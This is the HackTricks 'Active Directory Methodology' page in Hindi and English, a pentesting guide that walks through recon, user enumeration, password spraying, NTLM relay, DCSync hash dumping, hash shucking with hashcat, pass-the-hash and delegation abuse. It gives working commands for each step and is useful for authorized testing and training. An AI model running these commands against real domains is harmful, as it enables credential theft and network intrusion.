# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** एक मूलभूत technology के रूप में कार्य करता है, जो **network administrators** को network के भीतर **domains**, **users**, और **objects** को efficiently create और manage करने में सक्षम बनाता है। इसे scale करने के लिए engineered किया गया है, जिससे users की एक बड़ी संख्या को manageable **groups** और **subgroups** में organize किया जा सके, जबकि विभिन्न levels पर **access rights** को नियंत्रित किया जा सके।

**Active Directory** की structure तीन primary layers से बनी होती है: **domains**, **trees**, और **forests**। एक **domain** objects के एक collection को encompass करता है, जैसे **users** या **devices**, जो एक common database share करते हैं। **Trees** ऐसे domains के groups हैं जो एक shared structure से जुड़े होते हैं, और एक **forest** multiple trees के collection को represent करता है, जो **trust relationships** के माध्यम से interconnected होते हैं, और organizational structure की सबसे ऊपरी layer बनाते हैं। इन प्रत्येक levels पर specific **access** और **communication rights** designate किए जा सकते हैं।

**Active Directory** के key concepts में शामिल हैं:

1. **Directory** – Active Directory objects से संबंधित सभी information को रखता है।
2. **Object** – directory के भीतर entities को दर्शाता है, जिनमें **users**, **groups**, या **shared folders** शामिल हैं।
3. **Domain** – directory objects के लिए एक container के रूप में कार्य करता है, और एक **forest** के भीतर multiple domains के coexist करने की क्षमता रखता है, जिनमें से प्रत्येक अपनी object collection बनाए रखता है।
4. **Tree** – domains का एक grouping जो एक common root domain share करते हैं।
5. **Forest** – Active Directory में organizational structure का सर्वोच्च स्तर, जो कई trees से मिलकर बना होता है जिनके बीच **trust relationships** होती हैं।

**Active Directory Domain Services (AD DS)** सेवाओं की एक श्रेणी को encompass करता है जो network के भीतर centralized management और communication के लिए critical हैं। इन services में शामिल हैं:

1. **Domain Services** – data storage को centralize करता है और **users** और **domains** के बीच interactions को manage करता है, जिसमें **authentication** और **search** functionalities शामिल हैं।
2. **Certificate Services** – secure **digital certificates** के creation, distribution, और management की देखरेख करता है।
3. **Lightweight Directory Services** – **LDAP protocol** के माध्यम से directory-enabled applications को support करता है।
4. **Directory Federation Services** – multiple web applications के across users को एक ही session में authenticate करने के लिए **single-sign-on** capabilities प्रदान करता है।
5. **Rights Management** – इसके unauthorized distribution और use को regulate करके copyright material की safeguarding में सहायता करता है।
6. **DNS Service** – **domain names** के resolution के लिए crucial है।

अधिक विस्तृत explanation के लिए देखें: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

**AD पर attack** करना सीखने के लिए आपको **Kerberos authentication process** को वास्तव में अच्छी तरह **समझना** होगा।\
[**अगर आपको अभी भी नहीं पता कि यह कैसे काम करता है, तो यह page पढ़ें।**](kerberos-authentication.md)

## Cheat Sheet

आप [https://wadcoms.github.io/](https://wadcoms.github.io) पर बहुत कुछ देख सकते हैं ताकि यह जल्दी से समझ सकें कि AD को enumerate/exploit करने के लिए कौन-कौन से commands run कर सकते हैं।

> [!WARNING]
> Kerberos communication actions perform करने के लिए **full qualifid name (FQDN)** की आवश्यकता होती है। अगर आप IP address से किसी machine को access करने की कोशिश करते हैं, तो **यह NTLM use करेगा, kerberos नहीं**।

## Recon Active Directory (No creds/sessions)

अगर आपके पास सिर्फ AD environment का access है लेकिन कोई credentials/sessions नहीं हैं, तो आप यह कर सकते हैं:

- **Pentest the network:**
- Network scan करें, machines और open ports ढूंढें, और **vulnerabilities exploit** करने या उनसे **credentials extract** करने की कोशिश करें (उदाहरण के लिए, [printers बहुत interesting targets हो सकते हैं](ad-information-in-printers.md).
- DNS enumerate करने से domain के key servers के बारे में जानकारी मिल सकती है, जैसे web, printers, shares, vpn, media, आदि।
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- और जानकारी के लिए General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) पर एक नज़र डालें कि यह कैसे करना है।
- **smb services पर null और Guest access check करें** (यह modern Windows versions पर काम नहीं करेगा):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB server को enumerate करने की अधिक detailed guide यहाँ मिल सकती है:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap enumerate करें**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP को enumerate करने की अधिक detailed guide यहाँ मिल सकती है (anonymous access पर **विशेष ध्यान दें**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Network poison करें**
- [**Responder के साथ services impersonate**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) करके credentials इकट्ठा करें
- [**relay attack का abuse**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) करके host access करें
- [**evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) के fake UPnP services expose करके credentials इकट्ठा करें
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- internal documents, social media, services (mainly web) के भीतर और publicly available sources से usernames/names extract करें।
- अगर आपको company workers के complete names मिलते हैं, तो आप अलग-अलग AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)) try कर सकते हैं। सबसे common conventions हैं: _NameSurname_, _Name.Surname_, _NamSur_ (हर एक के 3 letters), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123)।
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) और [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages देखें।
- **Kerbrute enum**: जब एक **invalid username requested** किया जाता है, तो server **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ के साथ respond करेगा, जिससे हम यह निर्धारित कर सकते हैं कि username invalid था। **Valid usernames** या तो **AS-REP** response में TGT प्रदान करेंगे या error _KRB5KDC_ERR_PREAUTH_REQUIRED_ देंगे, जो indicate करता है कि user को pre-authentication करनी आवश्यक है।
- **No Authentication against MS-NRPC**: domain controllers पर MS-NRPC (Netlogon) interface के खिलाफ auth-level = 1 (No authentication) का use करके। यह method `DsrGetDcNameEx2` function को call करता है, जब MS-NRPC interface bind हो जाता है, ताकि बिना किसी credentials के यह check किया जा सके कि user या computer मौजूद है या नहीं। [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool इस प्रकार की enumeration implement करता है। Research यहाँ मिल सकती है [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) सर्वर**

यदि आपको नेटवर्क में इनमें से कोई सर्वर मिला है, तो आप उस पर भी **user enumeration** कर सकते हैं। उदाहरण के लिए, आप टूल [**MailSniper**](https://github.com/dafthack/MailSniper) का उपयोग कर सकते हैं:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> आप [**इस github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) और इस एक ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) में usernames की lists पा सकते हैं।
>
> हालांकि, recon step से, जो आपको इस से पहले perform करना चाहिए था, आपको कंपनी में काम करने वाले लोगों के **नाम** होने चाहिए। नाम और surname के साथ आप संभावित valid usernames generate करने के लिए [**namemash.py**](https://gist.github.com/superkojiman/11076951) script का उपयोग कर सकते हैं।

### एक या कई usernames जानना

ठीक है, तो आपको पता है कि आपके पास पहले से एक valid username है लेकिन passwords नहीं हैं... तब कोशिश करें:

- [**ASREPRoast**](asreproast.md): यदि किसी user के पास attribute _DONT_REQ_PREAUTH_ **नहीं** है, तो आप उस user के लिए एक **AS_REP message request** कर सकते हैं जिसमें password के derivation से encrypted कुछ data होगा।
- [**Password Spraying**](password-spraying.md): चलिए discovered users के साथ सबसे **common passwords** आज़माते हैं, शायद कोई user खराब password इस्तेमाल कर रहा हो (password policy ध्यान में रखें!)।
- ध्यान दें कि आप users के mail servers तक access पाने के लिए **OWA servers को भी spray** कर सकते हैं।


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

आप network के कुछ protocols को **poison** करके कुछ challenge **hashes** प्राप्त कर सकते हैं जिन्हें crack किया जा सकता है:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

यदि आपने active directory को enumerate कर लिया है, तो आपके पास **और emails** और **network की बेहतर समझ** होगी। आप AD env तक पहुँच पाने के लिए NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) को force करने में सक्षम हो सकते हैं।

### NetExec workspace-driven recon & relay posture checks

- AD recon state को हर engagement के लिए अलग रखने के लिए **`nxcdb` workspaces** का उपयोग करें: `workspace create <name>` `~/.nxc/workspaces/<name>` के तहत per-protocol SQLite DBs (smb/mssql/winrm/ldap/etc) बनाता है। `proto smb|mssql|winrm` के साथ views बदलें और `creds` के साथ gathered secrets सूचीबद्ध करें। काम पूरा होने पर sensitive data को manually purge करें: `rm -rf ~/.nxc/workspaces/<name>`.
- **`netexec smb <cidr>`** के साथ quick subnet discovery **domain**, **OS build**, **SMB signing requirements**, और **Null Auth** दिखाता है। `(signing:False)` दिखाने वाले members **relay-prone** होते हैं, जबकि DCs अक्सर signing require करते हैं।
- Targeting आसान बनाने के लिए NetExec output से सीधे **/etc/hosts** में **hostnames** generate करें:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- जब **SMB relay to the DC signing द्वारा blocked** हो, तब भी **LDAP** posture probe करें: `netexec ldap <dc>` `(signing:None)` / weak channel binding दिखाता है। एक DC जिसमें SMB signing required है लेकिन LDAP signing disabled है, फिर भी abuses जैसे **SPN-less RBCD** के लिए viable **relay-to-LDAP** target रहता है।

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs कभी-कभी **masked admin passwords in HTML** embed करती हैं। source/devtools देखने पर cleartext मिल सकता है (जैसे, `<input value="<password>">`), जिससे scan/print repositories तक Basic-auth access मिल जाती है।
- Retrieved print jobs में कभी-कभी **plaintext onboarding docs** होते हैं जिनमें per-user passwords होते हैं। testing के दौरान pairings aligned रखें:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

यदि आप **null or guest user** से **other PCs or shares** access कर सकते हैं, तो आप **files** (जैसे SCF file) place कर सकते हैं, जो अगर किसी तरह accessed हों, तो आपके खिलाफ **NTLM authentication trigger** करेंगे, ताकि आप **NTLM challenge** steal करके उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** हर उस NT hash को, जो आपके पास पहले से है, एक candidate password की तरह treat करता है, उन slower formats के लिए जिनका key material सीधे NT hash से derived होता है। Kerberos RC4 tickets, NetNTLM challenges, या cached credentials में long passphrases brute-force करने के बजाय, आप NT hashes को Hashcat के NT-candidate modes में feed करते हैं और बिना plaintext जाने password reuse validate करते हैं। यह खास तौर पर domain compromise के बाद powerful होता है, जब आप हजारों current और historical NT hashes harvest कर सकते हैं।

Shucking का उपयोग तब करें जब:

- आपके पास DCSync, SAM/SECURITY dumps, या credential vaults से NT corpus हो और आपको दूसरे domains/forests में reuse test करना हो।
- आप RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, या DCC/DCC2 blobs capture करें।
- आप long, uncrackable passphrases के लिए reuse जल्दी prove करना चाहते हों और तुरंत Pass-the-Hash के जरिए pivot करना चाहते हों।

यह technique उन encryption types पर **काम नहीं करती** जिनकी keys NT hash नहीं होतीं (जैसे Kerberos etype 17/18 AES)। अगर domain AES-only enforce करता है, तो आपको regular password modes पर वापस जाना होगा।

#### Building an NT hash corpus

- **DCSync/NTDS** – `secretsdump.py` को history के साथ use करें ताकि NT hashes (और उनके previous values) का सबसे बड़ा संभव set मिल सके:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries candidate pool को बहुत बढ़ा देती हैं, क्योंकि Microsoft हर account के लिए up to 24 previous hashes store कर सकता है। NTDS secrets harvest करने के और तरीके के लिए देखें:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (या Mimikatz `lsadump::sam /patch`) local SAM/SECURITY data और cached domain logons (DCC/DCC2) extract करता है। इन hashes को deduplicate करके उसी `nt_candidates.txt` list में जोड़ दें।
- **Track metadata** – हर hash के साथ username/domain keep करें (भले ही wordlist में सिर्फ hex हो)। Matching hashes आपको तुरंत बता देते हैं कि कौन सा principal password reuse कर रहा है, जब Hashcat winning candidate print करता है।
- उसी forest या trusted forest से candidates को prefer करें; shucking के दौरान overlap की संभावना वही सबसे अधिक होती है।

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **raw 32-hex NT hashes** ही रहने चाहिए। rule engines disable करें (कोई `-r` नहीं, कोई hybrid modes नहीं), क्योंकि mangling candidate key material को corrupt कर देता है।
- ये modes inherently faster नहीं हैं, लेकिन NTLM keyspace (~30,000 MH/s on an M3 Max) Kerberos RC4 (~300 MH/s) से ~100× तेज है। एक curated NT list test करना slow format में पूरे password space को explore करने से कहीं सस्ता है।
- हमेशा **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) चलाएँ, क्योंकि modes 31500/31600/35300/35400 हाल ही में आए हैं।
- अभी AS-REQ Pre-Auth के लिए कोई NT mode नहीं है, और AES etypes (19600/19700) के लिए plaintext password चाहिए क्योंकि उनकी keys PBKDF2 से UTF-16LE passwords से derived होती हैं, raw NT hashes से नहीं।

#### Example – Kerberoast RC4 (mode 35300)

1. low-privileged user के साथ target SPN के लिए एक RC4 TGS capture करें (details के लिए Kerberoast page देखें):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. अपने NT list के साथ ticket shuck करें:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat हर NT candidate से RC4 key derive करता है और `$krb5tgs$23$...` blob validate करता है। Match यह confirm करता है कि service account आपके existing NT hashes में से किसी एक का उपयोग करता है।

3. तुरंत PtH के जरिए pivot करें:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

ज़रूरत होने पर आप बाद में `hashcat -m 1000 <matched_hash> wordlists/` से plaintext recover कर सकते हैं।

#### Example – Cached credentials (mode 31600)

1. compromised workstation से cached logons dump करें:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. interesting domain user वाली DCC2 line को `dcc2_highpriv.txt` में copy करें और उसे shuck करें:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. सफल match आपको आपकी list में पहले से known NT hash देता है, जिससे prove होता है कि cached user password reuse कर रहा है। इसे सीधे PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) के लिए use करें या fast NTLM mode में brute-force करके string recover करें।

Exactly यही workflow NetNTLM challenge-responses (`-m 27000/27100`) और DCC (`-m 31500`) पर भी लागू होता है। एक बार match identify हो जाए, तो आप relay, SMB/WMI/WinRM PtH, या offline masks/rules से NT hash re-crack लॉन्च कर सकते हैं।



## Enumerating Active Directory WITH credentials/session

इस phase के लिए आपको **valid domain account के credentials या session compromise** करना होगा। अगर आपके पास कुछ valid credentials हैं या domain user के रूप में shell है, तो **यह याद रखें कि पहले दिए गए options अभी भी other users compromise करने के लिए मौजूद हैं**।

Authenticated enumeration शुरू करने से पहले आपको यह जानना चाहिए कि **Kerberos double hop problem** क्या है।


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account को compromise करना पूरे domain को compromise करना शुरू करने का **बड़ा कदम** है, क्योंकि तब आप **Active Directory Enumeration** शुरू कर पाएँगे:

[**ASREPRoast**](asreproast.md) के संदर्भ में आप अब हर possible vulnerable user ढूँढ सकते हैं, और [**Password Spraying**](password-spraying.md) के संदर्भ में आप सभी usernames की **list** प्राप्त कर सकते हैं और compromised account का password, empty passwords, और नए promising passwords try कर सकते हैं।

- आप [**basic recon करने के लिए CMD**](../basic-cmd-for-pentesters.md#domain-info) का उपयोग कर सकते हैं
- आप [**recon के लिए powershell**](../basic-powershell-for-pentesters/index.html) भी उपयोग कर सकते हैं, जो ज़्यादा stealthy होगा
- आप अधिक detailed information निकालने के लिए [**powerview का use**](../basic-powershell-for-pentesters/powerview.md) भी कर सकते हैं
- Active Directory में recon के लिए एक और amazing tool [**BloodHound**](bloodhound.md) है। यह **बहुत stealthy नहीं** है (आपके collection methods पर निर्भर करता है), लेकिन **अगर आपको इसकी परवाह नहीं है** तो आपको इसे ज़रूर try करना चाहिए। देखें कि users कहाँ RDP कर सकते हैं, दूसरे groups तक path क्या है, आदि।
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD के DNS records**](ad-dns-records.md), क्योंकि उनमें interesting information हो सकती है।
- एक **GUI वाला tool** जो आप directory enumerate करने के लिए use कर सकते हैं वह है **AdExplorer.exe** from **SysInternal** Suite।
- आप LDAP database में **ldapsearch** से भी search कर सकते हैं, fields _userPassword_ & _unixUserPassword_ में credentials ढूँढने के लिए, या _Description_ में भी। cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- अगर आप **Linux** use कर रहे हैं, तो आप [**pywerview**](https://github.com/the-useless-one/pywerview) से भी domain enumerate कर सकते हैं।
- आप automated tools भी try कर सकते हैं जैसे:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Windows से सभी domain usernames प्राप्त करना बहुत आसान है (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). Linux में, आप use कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration section छोटा लगे, यह सबसे important part है। links खोलें (mainly cmd, powershell, powerview और BloodHound वाले), domain enumerate करना सीखें और practice करें जब तक आप comfortable महसूस न करें। एक assessment के दौरान, यही वह key moment होगा जहाँ से आप DA तक पहुँचने का रास्ता ढूँढेंगे या यह तय करेंगे कि कुछ नहीं किया जा सकता।

### Kerberoast

Kerberoasting में **TGS tickets** प्राप्त करना शामिल है, जो user accounts से जुड़े services द्वारा उपयोग होते हैं, और उनकी encryption को crack करना — जो user passwords पर आधारित होती है — **offline**.

इसके बारे में और:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

एक बार जब आप कुछ credentials obtain कर लेते हैं, तो आप check कर सकते हैं कि क्या आपको किसी **machine** तक access है। इसके लिए, आप अपने ports scans के अनुसार अलग-अलग protocols के साथ कई servers पर connect करने की कोशिश करने के लिए **CrackMapExec** use कर सकते हैं।

### Local Privilege Escalation

अगर आपने credentials या एक session compromise कर लिया है as a regular domain user और आपके पास इस user के साथ domain की किसी भी machine तक **access** है, तो आपको locally privileges escalate करने और credentials loot करने का रास्ता ढूँढना चाहिए। इसका कारण यह है कि सिर्फ local administrator privileges के साथ ही आप memory (LSASS) और locally (SAM) में अन्य users के hashes dump कर पाएँगे।

इस book में [**Windows में local privilege escalation**](../windows-local-privilege-escalation/index.html) और एक [**checklist**](../checklist-windows-privilege-escalation.md) पर एक complete page है। साथ ही, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) use करना न भूलें।

### Current Session Tickets

यह बहुत **unlikely** है कि आपको current user के **tickets** मिलें जो आपको unexpected resources access करने की permission दें, लेकिन आप check कर सकते हैं:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

अगर आपने active directory को enumerate कर लिया है, तो आपके पास **और emails** और **network की बेहतर समझ** होगी। आप NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.** को force करने में सक्षम हो सकते हैं

### Looks for Creds in Computer Shares | SMB Shares

अब जब आपके पास कुछ basic credentials हैं, आपको check करना चाहिए कि क्या आप AD के अंदर shared किसी भी **interesting files** को **find** कर सकते हैं। आप यह manually कर सकते हैं, लेकिन यह बहुत boring repetitive task है (और अगर आपको hundreds of docs check करने पड़ें तो और भी ज्यादा)।

[**इस link को follow करें ताकि आप उन tools के बारे में जान सकें जिन्हें आप use कर सकते हैं।**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

अगर आप **other PCs or shares** को **access** कर सकते हैं, तो आप **files place** कर सकते हैं (जैसे SCF file) जो अगर किसी तरह accessed हुईं, तो आपके against एक NTLM authentication **trigger** करेंगी ताकि आप **NTLM challenge** को **steal** करके crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

इस vulnerability ने किसी भी authenticated user को **domain controller compromise** करने की अनुमति दी।


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**निम्न techniques के लिए एक regular domain user पर्याप्त नहीं है, इन attacks को perform करने के लिए आपको कुछ special privileges/credentials चाहिए।**

### Hash extraction

उम्मीद है आपने [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) का use करके किसी **local admin** account को **compromise** करने में सफलता पाई होगी।\
फिर, अब समय है memory और locally सभी hashes dump करने का।\
[**Hashes obtain करने के अलग-अलग तरीकों के बारे में इस page को पढ़ें।**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**एक बार आपके पास किसी user का hash हो जाए**, तो आप इसका use करके उसकी **impersonate** कर सकते हैं।\
आपको कोई ऐसा **tool** use करना होगा जो उस hash का उपयोग करके **NTLM authentication perform** करे, **या** आप एक नया **sessionlogon** बना सकते हैं और उस hash को **LSASS** में **inject** कर सकते हैं, ताकि जब भी कोई **NTLM authentication perform** हो, **वही hash use** हो। आखिरी option वही है जो mimikatz करता है।\
[**और जानकारी के लिए इस page को पढ़ें।**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

इस attack का उद्देश्य **Kerberos tickets request** करने के लिए user NTLM hash का use करना है, जो common Pass The Hash over NTLM protocol का एक alternative है। इसलिए, यह खास तौर पर **उन networks में useful** हो सकता है जहाँ NTLM protocol disabled है और authentication protocol के रूप में केवल **Kerberos allowed** है।


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** attack method में, attackers password या hash values की बजाय **user का authentication ticket steal** करते हैं। फिर इस stolen ticket का उपयोग **user को impersonate** करने के लिए किया जाता है, जिससे network के अंदर resources और services तक unauthorized access मिलता है।


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

अगर आपके पास किसी **local administrator** का **hash** या **password** है, तो आपको इसका use करके दूसरे **PCs** पर locally **login** करने की कोशिश करनी चाहिए।
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> ध्यान दें कि यह काफी **noisy** है और **LAPS** इसे **mitigate** करेगा।

### MSSQL Abuse & Trusted Links

अगर किसी user के पास **MSSQL instances** को **access** करने के privileges हैं, तो वह इसका उपयोग करके MSSQL host पर **commands execute** कर सकता है (अगर वह SA के रूप में चल रहा हो), NetNTLM **hash** **steal** कर सकता है, या यहां तक कि **relay** **attack** भी कर सकता है।\
साथ ही, अगर किसी MSSQL instance पर किसी दूसरे MSSQL instance द्वारा trust किया जाता है (database link)। अगर user के पास trusted database पर privileges हैं, तो वह **trust relationship** का उपयोग करके दूसरे instance में भी queries execute कर पाएगा। ये trusts chain किए जा सकते हैं और किसी बिंदु पर user को कोई misconfigured database मिल सकता है जहां वह commands execute कर सके।\
**डेटाबेस के बीच links forest trusts के across भी काम करते हैं।**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory और deployment suites अक्सर credentials और code execution तक powerful paths expose करती हैं। देखें:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

अगर आपको किसी Computer object में attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) वाला कोई Computer object मिलता है और आपके पास computer में domain privileges हैं, तो आप उस computer पर login करने वाले हर user की memory से TGTs dump कर पाएंगे।\
तो, अगर कोई **Domain Admin** उस computer पर logins करता है, तो आप उसका TGT dump करके [Pass the Ticket](pass-the-ticket.md) का उपयोग करते हुए उसकी impersonate कर सकेंगे।\
constrained delegation की मदद से आप यहां तक कि **automatically compromise a Print Server** भी कर सकते हैं (उम्मीद है वह DC होगा)।

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

अगर किसी user या computer को "Constrained Delegation" की अनुमति है, तो वह **किसी computer पर कुछ services access करने के लिए किसी भी user की impersonate** कर सकेगा।\
फिर, अगर आप इस user/computer का **hash compromise** कर लेते हैं, तो आप **किसी भी user** की (यहां तक कि domain admins की भी) impersonate करके कुछ services access कर पाएंगे।


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

किसी remote computer के Active Directory object पर **WRITE** privilege होने से **elevated privileges** के साथ code execution हासिल की जा सकती है:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromised user के पास कुछ domain objects पर कुछ **interesting privileges** हो सकते हैं, जो आपको बाद में privileges **move** laterally/**escalate** करने दे सकते हैं।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

